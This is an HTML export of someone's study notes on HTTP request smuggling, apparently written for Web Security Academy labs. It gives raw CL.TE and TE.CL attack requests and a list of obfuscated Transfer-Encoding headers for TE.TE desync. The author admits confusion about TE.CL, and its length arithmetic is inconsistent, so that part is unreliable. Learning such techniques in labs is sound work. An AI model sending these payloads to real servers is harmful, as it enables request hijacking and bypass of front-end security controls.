<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>How To</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>How To</h1><br/>• Place both headers in the request and manipulate<br />• Different situations (listed)<br />• Need to include \r\n\r\n following the final 0<br /><strong><br />CE.TE</strong><br />• Front-end use Content-Length, Back-end use Transfer Encoding<br />• Front-end will check for length<br />• Back End will look at the chunks -&gt; terminate request with a 0 length chunk, and throw a smuggled request underneath and it will be taken as a new request.<br /><code>POST / HTTP/1.1<br />Host: your-lab-id.web-security-academy.net<br />Connection: keep-alive<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 6<br />Transfer-Encoding: chunked<br /><br />0<br /><br />G</code><br />• The above will send a GPOST request (lol)<br /><strong><br />TE.CL</strong><br />• Front-end use Transfer Encoding, Back-end use Content-Length<br />• TE will process first chunk number, not the value, so the smuggled value isn&#39;t processed by either front or back end.<br />• Change Content-Length to first size +2 (because ‘num’ + ‘/’ + ‘n’ = 3)<br /><br /><code>POST / HTTP/1.1<br />Host: vulnerable-website.com<br />Connection: keep-alive<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 3<br />Transfer-Encoding: chunked<br /><br />8 </code>&lt;- size of rest of request, written as hex if you want (including /n and not the 0)<code><br />SMUGGLED<br />0</code><br />• Still much confusion with this one ......<br /><strong><br />TE.TE</strong><br />• Front &amp; Back end support Transfer Encoding, but one server can be induced not to process it by obfuscating the header<br />• try variations of these:<br /><code>Transfer-Encoding: xchunked<br /><br />Transfer-Encoding : chunked<br /><br />Transfer-Encoding: chunked<br />Transfer-Encoding: x<br /><br />Transfer-Encoding:[tab]chunked<br /><br />[space]Transfer-Encoding: chunked<br /><br />X: X[\n]Transfer-Encoding: chunked<br /><br />Transfer-Encoding<br />: chunked</code></div></body></html>